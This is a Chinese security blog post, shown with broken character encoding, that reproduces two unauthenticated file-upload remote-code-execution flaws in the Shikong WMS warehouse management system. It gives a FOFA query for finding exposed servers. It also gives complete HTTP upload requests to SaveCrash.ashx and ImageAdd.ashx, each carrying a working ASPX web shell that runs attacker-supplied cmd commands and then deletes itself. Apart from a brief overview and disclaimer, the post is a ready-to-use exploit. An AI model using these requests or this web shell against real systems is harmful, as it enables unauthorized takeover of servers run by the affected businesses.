#  æ—¶ç©ºWMS-ä»“å‚¨ç²¾ç»†åŒ–ç®¡ç†ç³»ç»Ÿä¸¤å¤„æ–‡ä»¶ä¸Šä¼ è‡´RCEæ¼æ´å¤ç°   
åŸåˆ› çº¢å²¸åŸºåœ°èµµå°é¾™  æš—å½±ç½‘å®‰å®éªŒå®¤   2024-12-02 09:25  
  
## äº§å“ç®€ä»‹  
  
  
æ—¶ç©ºWMS-ä»“å‚¨ç²¾ç»†åŒ–,ç®¡ç†ç³»ç»ŸQæ˜¯ä¸€æ¬¾é«˜æ•ˆã€æ™ºèƒ½çš„ä»“å‚¨ç®¡ç†å·¥å…·ï¼Œæ—¨åœ¨å¸®åŠ©ä¼ä¸šå®ç°ä»“åº“çš„ç²¾ç»†åŒ–ç®¡ç†å’Œé«˜æ•ˆè¿è¥ã€‚ç”±éƒ‘å·æ—¶ç©ºè½¯ä»¶å¼€å‘ï¼Œä¸“æ³¨äºä»¥æ•°å­—åŒ–ã€æ™ºèƒ½åŒ–æ¨åŠ¨ä¼ä¸šè¿›æ­¥ã€‚è¯¥ç³»ç»ŸåŸºäºå…ˆè¿›çš„ä»“å‚¨ç®¡ç†ç†å¿µå’ŒæŠ€æœ¯æ¶æ„ï¼Œèåˆäº†ç‰©è”ç½‘ã€ç§»åŠ¨äº’è”ç­‰å‰æ²¿æŠ€æœ¯ï¼Œå®ç°äº†å¯¹ä»“åº“å†…ç‰©èµ„çš„å…¨é¢ã€ç²¾å‡†ã€é«˜æ•ˆç®¡ç†ã€ç³»ç»Ÿè¯ç”¨åƒå„ç±»ä»“å‚¨ç‰©æµä¼ä¸šï¼ŒåŒ…æ‹¬ç”µå•†ä»“å‚¨ã€ç¬¬ä¸€æ–¹ç‰©æµã€ç”Ÿäº§ä»“å‚¨ç­‰å¤šä¸ªé¢†åŸŸã€‚é€šè¿‡ä½¿ç”¨è¯¥ç³»ç»Ÿï¼Œä¼ä¸šå¯ä»¥å®ç°å¯¹ä»“åº“å†…ç‰©èµ„çš„å…¨é¢æŒæ§å’Œé«˜æ•ˆç®¡ç†ï¼Œæé«˜åº“å­˜å‘¨è½¬ç‡ï¼Œé™ä½åº“å­˜æˆæœ¬ï¼Œæå‡ä¼ä¸šç«äº‰ä¼˜åŠ¿ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uplDiadAcTkxQEfF8omrUQB7crz6fpGEXLuMtzpB5QNxpsVicEDePnqwbZDYpbjMasRhDZxZdKcSlibA/640?wx_fmt=png&from=appmsg "")  
  
  
## æ¼æ´æ¦‚è¿°  
  
  
æ—¶ç©ºWMS-ä»“å‚¨ç²¾ç»†åŒ–ç®¡ç†ç³»ç»Ÿ SaveCrash.ashx æ¥å£å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œç”µå­èµ„æ–™ç®¡ç†ç³»ç»Ÿ /MenulmageManqerlmaaeUpload.ashx æ¥å£å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯é€šè¿‡è¯¥æ¼æ´åœ¨æœåŠ¡å™¨ç«¯ä»»æ„æ‰§è¡Œä»£ç ï¼Œå†™å…¥åé—¨ï¼Œè·å–æœåŠ¡å™¨æƒé™ï¼Œè¿›è€Œæ§åˆ¶æ•´ä¸ª webæœåŠ¡å™¨ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**FOFA**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
  
```
body="SKControlKLForJson.ashx"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uplDiadAcTkxQEfF8omrUQB79KEPk90BEWsgNX91rs3rEYhhpHZzyicCNhbqaziat8E0Az7DHEAexvOg/640?wx_fmt=png&from=appmsg "")  
## SaveCrash.ashxæ¼æ´å¤ç°  
```
POST /crash/SaveCrash.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip
 
------WebKitFormBoundaryssh7UfnPpGU7BXfK
Content-Disposition: form-data; name="file"; filename="rce.aspx"
Content-Type: text/plain
 
<%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());System.IO.File.Delete(Request.PhysicalPath);Response.End();%>
------WebKitFormBoundaryssh7UfnPpGU7BXfK--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uplDiadAcTkxQEfF8omrUQB7wticFvB0SQzjSez5QsamibWjtldDLmYSPbPWmHbWax3KEyhiam8nuptAg/640?wx_fmt=png&from=appmsg "")  
  
RCE  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uplDiadAcTkxQEfF8omrUQB7XuaVjdPjIp7AGudpCcib5PMNLCKnht8hd6nYibV2SlETyPeDqwGsblHQ/640?wx_fmt=png&from=appmsg "")  
  
## ImageAdd.ashxæ¼æ´å¤ç°  
```
POST /ImageUpload/ImageAdd.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip
 
------WebKitFormBoundaryssh7UfnPpGU7BXfK
Content-Disposition: form-data; name="file"; filename="rce.aspx"
Content-Type: text/plain
 
<%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());System.IO.File.Delete(Request.PhysicalPath);Response.End();%>
------WebKitFormBoundaryssh7UfnPpGU7BXfK--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uplDiadAcTkxQEfF8omrUQB79eT0TyiaU4EO7FNh9cGXPee3gSlvUXBiaKKG4zotq6qe8G2W5L9KRBhA/640?wx_fmt=png&from=appmsg "")  
  
RCE  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2uplDiadAcTkxQEfF8omrUQB7oCGrD9tw4yRwaKywvF7NYic7tMgDcg1HSdCcibxHCibE4n5Pyhwm7ngqw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
**å…è´£å£°æ˜**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4yJaCArQwpACMJuBxI11jPgvHCxQZFQxPrt5iaQRibgGl0aIzFo4hDCYcFuyViag6zhuqNEjjeasfMEAy1rkaOahw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
æ–‡ç« æ‰€æ¶‰åŠå†…å®¹ï¼Œä»…ä¾›å®‰å…¨ç ”ç©¶ä¸æ•™å­¦ä¹‹ç”¨ï¼Œç”±äºä¼ æ’­ã€åˆ©ç”¨æœ¬æ–‡æ‰€æä¾›çš„ä¿¡æ¯è€Œé€ æˆçš„ä»»ä½•ç›´æ¥æˆ–è€…é—´æ¥çš„åæœåŠæŸå¤±ï¼Œå‡ç”±ä½¿ç”¨è€…æœ¬äººè´Ÿè´£ï¼Œä½œè€…ä¸ä¸ºæ­¤æ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚  
  
  
å¤§å®¶å¯¹äºç½‘ç»œå®‰å…¨æ„Ÿå…´è¶£çš„è¯ï¼Œä¸å¦¨æ¥åŠ ä¸€ä¸‹æˆ‘ä»¬çš„è€å¸ˆï¼Œæˆ‘ä»¬ä¼šå®šæœŸåœ¨ç»™å¤§å®¶åˆ†äº«  
**æ¸—é€****å·¥å…·**å’Œ  
**å®æˆ˜****æ–‡****ç« **ï¼Œè¿˜ä¼šæœ‰  
**æ¸—é€å…¬å¼€è¯¾**å¯ä»¥è¯•å¬ï¼  
  
**æ‰«ç æ·»åŠ ï¼Œæå‡è‡ªå·±ï¼**  
  
**ğŸ‘‡ğŸ‘‡ğŸ‘‡**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/XvnzjMsl2uqSvZE6x25icBxYJVFOCI9lDasEWqq2rXaaHicvykJsBK94cBdfxibU6fOQ2iaTJ0IKoVMmiaFbIAjJz4A/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
åç»­ä¸€äº›æ‰“å‡»çŠ¯ç½ªæ–‡ç« ä¼šåœ¨ä¸‹æ–¹å…¬ä¼—å·å‘å¸ƒ  
  
  
